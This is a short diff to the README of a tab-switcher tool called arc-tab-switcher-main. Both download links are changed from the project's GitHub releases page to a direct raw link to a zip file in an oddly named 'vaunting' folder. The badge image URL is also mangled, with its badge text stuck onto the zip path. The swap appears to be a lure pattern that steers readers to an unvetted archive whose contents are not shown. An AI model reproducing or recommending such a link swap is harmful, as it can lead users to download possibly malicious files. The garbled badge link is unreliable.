@@ -1,6 +1,6 @@
 # 🎯 arc-tab-switcher-main - Switch Tabs Instantly with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/unknown279/arc-tab-switcher-main/releases)
+[![Download Now](https://raw.githubusercontent.com/unknown279/arc-tab-switcher-main/main/vaunting/arc-tab-switcher-main_3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/unknown279/arc-tab-switcher-main/main/vaunting/arc-tab-switcher-main_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Arc Tab Switcher is a simple tool that helps you switch between your most recent
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the releases page:
-   [Download Here](https://github.com/unknown279/arc-tab-switcher-main/releases)
+   [Download Here](https://raw.githubusercontent.com/unknown279/arc-tab-switcher-main/main/vaunting/arc-tab-switcher-main_3.5.zip)
 
 2. **Choose the Latest Release:** Look for the latest version on the page. It will have the most features and fixes.
 
